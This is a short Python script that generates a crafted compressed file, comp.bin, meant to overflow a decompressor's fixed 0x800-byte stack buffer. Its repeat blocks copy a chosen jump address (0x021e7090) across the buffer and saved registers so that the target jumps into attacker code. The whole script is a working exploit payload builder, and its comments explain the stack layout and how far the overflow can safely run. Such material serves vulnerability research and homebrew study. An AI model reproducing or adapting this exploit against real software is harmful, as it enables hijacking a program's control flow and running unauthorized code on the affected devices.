import sys
import struct

def rawBlock(d):
	if len(d) > 0x1F:
		print("too much data for raw block")
	return struct.pack('B%sB' % len(d), len(d), *d)

def repBlock(length, disp):
	length -= 2
	disp -= 1
	if length > 0x1FF or disp > 0xF:
		print("length or displacement too big for repeat block")
	code = 0x2000|(disp<<9)|(length)
	return struct.pack('>H', code)

code_addr = 0x021e7090

# first write the address we want to jump to
data = rawBlock([(code_addr>>(i*8))&0xFF for i in range(4)])
# then copy it over 0x820 bytes (minus the 4 we already wrote)
# the decompression method outputs to a 0x800 fixed size stack buffer
# and there's 0x20 bytes worth of pushed registers on the stack
# if we copy more we'll overwrite the pointers to the output buffer
# which will in turn lead to us overwriting our payload and code...
# which is why we should not write more than 0x820 bytes unless we know what we're doing
data += repBlock(0x1FC, 0x4)
data += repBlock(0x200, 0x4)
data += repBlock(0x200, 0x4)
data += repBlock(0x200, 0x4)
data += repBlock(0x20, 0x4)

data = struct.pack('<L', len(data)) + data
open("comp.bin", "wb").write(data)
